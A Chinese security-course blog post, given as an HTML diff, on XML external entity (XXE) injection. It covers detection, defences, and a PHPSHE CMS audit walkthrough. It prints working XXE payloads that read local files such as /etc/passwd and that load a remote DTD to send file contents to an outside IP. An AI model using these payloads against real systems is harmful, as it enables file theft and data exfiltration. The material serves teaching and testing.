@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="思维导图见 41WEB攻防 知识点： 54、XXE&amp;XML-原理-用途&amp;外实体&amp;安全 55、XXE&amp;XML-黑盒-格式类型&amp;数据类型 56、XXE&amp;XML-白盒-函数审计&amp;回显方案  章节点：Web层面：Web2.0 &amp; Web3.0语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）OWTOP10：注入，文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="59WEB攻防-XXE">
+<meta property="og:url" content="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:description" content="思维导图见 41WEB攻防 知识点： 54、XXE&amp;XML-原理-用途&amp;外实体&amp;安全 55、XXE&amp;XML-黑盒-格式类型&amp;数据类型 56、XXE&amp;XML-白盒-函数审计&amp;回显方案  章节点：Web层面：Web2.0 &amp; Web3.0语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）OWTOP10：注入，文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/xxe.png">
+<meta property="article:published_time" content="2023-11-14T07:51:39.000Z">
+<meta property="article:modified_time" content="2023-11-14T08:11:11.490Z">
+<meta property="article:author" content="z7">
+<meta property="article:tag" content="WEB攻防">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/xxe.png">
+
+<link rel="canonical" href="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>59WEB攻防-XXE | 个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="个人博客" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+        <a target="_blank" rel="noopener" href="https://z7yy" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z7">
+      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          59WEB攻防-XXE
+        </h1>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-14 15:51:39 / 修改时间：16:11:11" itemprop="dateCreated datePublished" datetime="2023-11-14T15:51:39+08:00">2023-11-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p>
+<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
+<li>54、XXE&amp;XML-原理-用途&amp;外实体&amp;安全</li>
+<li>55、XXE&amp;XML-黑盒-格式类型&amp;数据类型</li>
+<li>56、XXE&amp;XML-白盒-函数审计&amp;回显方案</li>
+</ul>
+<h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….</p>
+<p> <img src="/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/xxe.png"></p>
+<h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。XXE漏洞XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危害。  </p>
+<p>XML 与 HTML 的主要差异：<br>XML 被设计为传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息 ，而XML旨在传输存储信息。<br>Example：网站的xml文件解析  </p>
+<h3 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h3><p>1、获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe<br>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行  </p>
+<h3 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="XXE白盒发现："></a>XXE白盒发现：</h3><p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等  </p>
+<h3 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h3><ul>
+<li>方案1-禁用外部实体  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</span><br><span class="line">Python：</span><br><span class="line">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li>
+<li>方案2-过滤用户提交的XML数据<br>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</li>
+</ul>
+<h2 id="XML-XXE-传输-原理-探针-利用-玩法"><a href="#XML-XXE-传输-原理-探针-利用-玩法" class="headerlink" title="XML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法"></a>XML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法</h2><h3 id="1、读取文件："><a href="#1、读取文件：" class="headerlink" title="1、读取文件："></a>1、读取文件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xiaodi [</span><br><span class="line">&lt;!ENTITY test SYSTEM  &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<p>1.1、带外测试：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://9v57ll.dnslog.cn&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="2、外部引用实体dtd："><a href="#2、外部引用实体dtd：" class="headerlink" title="2、外部引用实体dtd："></a>2、外部引用实体dtd：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/xiaodi.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;xiaodi&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">xiaodi.dtd</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="3、无回显读文件"><a href="#3、无回显读文件" class="headerlink" title="3、无回显读文件"></a>3、无回显读文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="4、其他玩法（协议）-见参考地址"><a href="#4、其他玩法（协议）-见参考地址" class="headerlink" title="4、其他玩法（协议）-见参考地址"></a>4、其他玩法（协议）-见参考地址</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a>  </p>
+<h2 id="XML-XXE-黑盒-JS-黑盒测试-类型修改"><a href="#XML-XXE-黑盒-JS-黑盒测试-类型修改" class="headerlink" title="XML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改"></a>XML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改</h2><p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a>   </p>
+<h3 id="XXE黑盒发现：-1"><a href="#XXE黑盒发现：-1" class="headerlink" title="XXE黑盒发现："></a>XXE黑盒发现：</h3><p>1、获取Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试<br>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe<br>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试<br>更改请求数据格式：Content-Type  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XML-XXE-白盒-CMS-PHPSHE-无回显"><a href="#XML-XXE-白盒-CMS-PHPSHE-无回显" class="headerlink" title="XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显"></a>XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显</h2><h3 id="审计流程："><a href="#审计流程：" class="headerlink" title="审计流程："></a>审计流程：</h3><p>1、漏洞函数simplexml_load_string<br>2、pe_getxml函数调用了漏洞函数<br>3、wechat_getxml调用了pe_getxml<br>4、notify_url调用了wechat_getxml<br>访问notify_url文件触发wechat_getxml函数,构造Paylod测试<br>先尝试读取文件，无回显后带外测试：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://1uwlwv.dnslog.cn&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="然后带外传递数据解决无回显："><a href="#然后带外传递数据解决无回显：" class="headerlink" title="然后带外传递数据解决无回显："></a>然后带外传递数据解决无回显：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">test.dtd：</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>z7
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/11/14/59WEB%E6%94%BB%E9%98%B2-XXE/" title="59WEB攻防-XXE">http://example.com/2023/11/14/59WEB攻防-XXE/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="wechat"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WEB%E6%94%BB%E9%98%B2/" rel="tag"># WEB攻防</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/14/58WEB%E6%94%BB%E9%98%B2-RCE/" rel="prev" title="58WEB攻防-RCE">
+      <i class="fa fa-chevron-left"></i> 58WEB攻防-RCE
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/11/26/60WEB%E6%94%BB%E9%98%B2-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/" rel="next" title="60WEB攻防-PHP反序列化1">
+      60WEB攻防-PHP反序列化1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+ 
+   <div>
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+   </div>
+ 
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81OTAzNi8zNTQ5OA=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="nav-number">1.</span> <span class="nav-text">思维导图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">章节点：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">详细点：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E9%BB%91%E7%9B%92%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">XXE黑盒发现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E7%99%BD%E7%9B%92%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">XXE白盒发现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E4%BF%AE%E5%A4%8D%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="nav-number">4.3.</span> <span class="nav-text">XXE修复防御方案：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-XXE-%E4%BC%A0%E8%BE%93-%E5%8E%9F%E7%90%86-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8-%E7%8E%A9%E6%B3%95"><span class="nav-number">5.</span> <span class="nav-text">XML&amp;XXE-传输-原理&amp;探针&amp;利用&amp;玩法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="nav-number">5.1.</span> <span class="nav-text">1、读取文件：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E5%AE%9E%E4%BD%93dtd%EF%BC%9A"><span class="nav-number">5.2.</span> <span class="nav-text">2、外部引用实体dtd：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">5.3.</span> <span class="nav-text">3、无回显读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E5%85%B6%E4%BB%96%E7%8E%A9%E6%B3%95%EF%BC%88%E5%8D%8F%E8%AE%AE%EF%BC%89-%E8%A7%81%E5%8F%82%E8%80%83%E5%9C%B0%E5%9D%80"><span 